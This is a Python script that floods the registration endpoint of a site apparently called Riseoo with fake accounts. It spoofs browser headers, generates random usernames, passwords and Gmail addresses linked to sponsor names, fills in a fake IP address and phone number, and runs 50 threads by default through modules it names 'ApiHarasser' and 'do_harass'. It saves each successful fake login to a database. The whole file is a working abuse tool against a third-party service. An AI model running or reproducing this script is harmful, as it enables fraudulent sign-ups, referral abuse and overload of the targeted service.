import sys
import concurrent.futures
from Harasser import ApiHarasser, RequestType
from models import RiseoAccountRegistration
import random
import string
from database.models import Sponsor
import json
from functions import read_data_from_file
from database.operations import get_all_sponsors, get_session, create_registered_user
from config import FILES_DIR
import logging

logging.basicConfig(filename="assets/logger.log",
                             format='%(levelname)s:%(message)s', level=logging.INFO)


SPONSORS = read_data_from_file(FILES_DIR / "valid_sponsors.txt")

SESSION = get_session()
HEADERS = {

    "Host": "api.riseoo.com",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Authorization": "Bearer undefined",
    "Content-Length": "336",
    "Origin": "https://portal.riseoo.com",
    "Connection": "keep-alive",
    "Referer": "https://portal.riseoo.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "TE": "trHEilers"
}


def generate_record(sponsor: str) -> RiseoAccountRegistration:
    random_number = random.randint(100, 999)
    random_letters = ''.join(random.choices(string.ascii_letters, k=4))

    username = f"{sponsor}{random_letters}"
    password = f"#{username.capitalize()}{random_number}#"
    email = f"{username}@gmail.com"

    return RiseoAccountRegistration(**{"sponsorUsername": sponsor, "side": 1, "username": username, "password": password, "fullName": username, "emailAddress": email,
                                       "contactNumber": "1-31212343212", "countryID": 219, "ipAddress": "123.123.123.123", "title": "Mr.", "panID": "", "bankAccountHolderName": "", "bankAccountNumber": "", "bankAccountIFSC": "", "bankAccountType": 0})


def do_harass(sponsor: Sponsor):
    global SESSION

    harasser = ApiHarasser(
        "https://api.riseoo.com/Registration", RequestType.POST, HEADERS)

    user_data = generate_record(sponsor.sponsor_username)

    response = harasser.do_request(
        data=user_data.json(), is_json=True)

    if response.ok:
        try:
            parsed_response = response.json()
            if "isSuccess" in list(parsed_response.keys()) and parsed_response['isSuccess']:
                create_registered_user(SESSION, user_data.username, user_data.password,
                                       user_data.emailAddress, sponsor.sponsor_username)

        except json.JSONDecodeError:
            logging.error("Response is not JSON Serializable")


def main():
    global SESSION

    sponsors: list[Sponsor] = get_all_sponsors(SESSION)

    workers = 50
    if len(sys.argv) > 1:
        if sys.argv[1].isnumeric():
            workers = int(sys.argv[1])

    print(f"== Initialized with {workers} workers ==\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(do_harass, sponsor)
                   for sponsor in sponsors]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                logging.error(f"Job failed: {exc}")


if __name__ == "__main__":
    main()
